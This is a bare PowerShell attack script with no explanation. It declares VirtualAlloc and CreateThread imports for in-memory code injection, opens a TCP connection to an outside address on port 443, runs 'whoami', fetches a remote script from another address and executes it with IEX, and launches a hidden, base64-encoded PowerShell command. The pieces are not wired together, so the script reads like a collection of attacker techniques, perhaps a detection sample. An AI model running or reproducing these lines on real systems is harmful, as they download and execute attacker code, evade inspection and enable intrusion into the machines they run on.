$src = @"
using System;
using System.Runtime.InteropServices;
public class K {
  [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
  [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
}
"@
Add-Type -TypeDefinition $src
$tcp = New-Object System.Net.Sockets.TcpClient("203.0.113.30", 443)
[System.Diagnostics.Process]::Start("cmd.exe", "/c whoami")
IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1")
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=
